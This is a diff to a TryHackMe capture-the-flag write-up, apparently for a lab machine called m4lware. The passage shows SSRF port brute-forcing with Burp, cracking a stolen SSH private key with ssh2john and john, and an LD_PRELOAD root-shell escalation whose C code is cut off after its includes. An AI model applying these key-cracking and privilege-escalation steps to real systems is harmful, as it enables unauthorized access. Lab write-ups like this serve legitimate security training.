@@ -72,8 +72,8 @@ This page provides the functionality that allows you to test a URL to see if it 
 
 I used burpsuite to bruteforce suspisous ports  
 
-![Screenshot_35](https://github.com/a-9-k/TryHackMe-Write_Ups/assets/53786047/76366f49-3a9c-4cee-9f7e-f28af617ee0a)
 
+![Screenshot_35](https://github.com/a-9-k/TryHackMe-Write_Ups/assets/53786047/76366f49-3a9c-4cee-9f7e-f28af617ee0a)
 
 
 <details>
@@ -281,13 +281,18 @@ the Content-Length: 1316 is diffrent from Content-Length of the others Ports
 ![Screenshot_34](https://github.com/a-9-k/TryHackMe-Write_Ups/assets/53786047/4ad3c70d-769b-4a4b-acdf-acfc6f00052f)
 
 in the home directory i found .ssh directory that contain id_rsa for saad user.
+
 ![Screenshot_36](https://github.com/a-9-k/TryHackMe-Write_Ups/assets/53786047/3f0ab065-fbcb-4501-94bf-b767eb0ba966)
 
 # Login via ssh
 
 ```sh
+-rw------- 1 saad saad   362 Jan 21  2023 .bash_history =====> its own by ower  user saad
+
 chmod 600 id_rsa
-ssh2john id_rsa > hash 
+
+ssh2john id_rsa > hash
+
 john   --wordlist=/opt/rockyou.txt  hash 
 $Using default input encoding: UTF-8
 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
@@ -329,7 +334,7 @@ User saad may run the following commands on m4lware:
 
 LD_PRELOAD is an environment variable in Unix-like systems, such as Linux, that allows you to specify additional shared libraries to be loaded before all others.
 With this i could write c code script to spawn a root shell ,shell.c
-I uploaded the script via python3 http.server to the Victim
+I uploaded the script via python3 http.server to the Victim.
 ```sh
 #include <stdio.h> 
 #include <stdlib.h>
